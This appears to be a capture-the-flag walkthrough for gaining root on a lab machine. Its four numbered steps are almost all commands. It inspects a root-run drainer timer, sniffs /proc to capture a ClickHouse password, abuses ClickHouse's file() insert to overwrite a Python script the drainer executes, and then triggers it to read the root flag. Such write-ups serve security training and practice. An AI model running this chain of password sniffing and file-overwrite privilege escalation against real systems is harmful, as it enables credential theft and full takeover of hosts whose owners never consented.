# Root Flag — Stream

## 1. Recon the drainer
systemctl list-timers aidx-dlq-drainer.timer     # every 2 min, User=root
cat /opt/ops/dlq_drainer.py
# calls clickhouse-client --password $(cat /etc/partner-sync/ch.pw)

## 2. Sniff /proc for CH default password
# on target: nohup python3 /dev/shm/proc_sniff.py --needle clickhouse-client --out /tmp/chhit.bin &
# from kali: python3 scripts/aidx_ingest.py --target 10.129.15.255 --malformed
# wait ≤2 min, then:  tr '\0' ' ' < /tmp/chhit.bin | grep -B1 clickhouse-client
# → CH_DEFAULT_PASS

## 3. GRANT FILE → overwrite formatter
HEX=$(xxd -p /tmp/aidx_quarantine_new.py | tr -d '\n')
python3 scripts/ch_http.py -u default -p "$CH_DEFAULT_PASS" \
  "INSERT INTO FUNCTION file('aidx_quarantine.py','RawBLOB') \
   SETTINGS engine_file_truncate_on_insert=1 SELECT unhex('$HEX')"
# NOTE: RawBLOB column name is `raw_blob`

## 4. Trigger drainer → root flag
python3 scripts/aidx_ingest.py --target 10.129.15.255 --malformed
sleep 130
ssh martin_cole@10.129.15.255 'cat /tmp/rflag'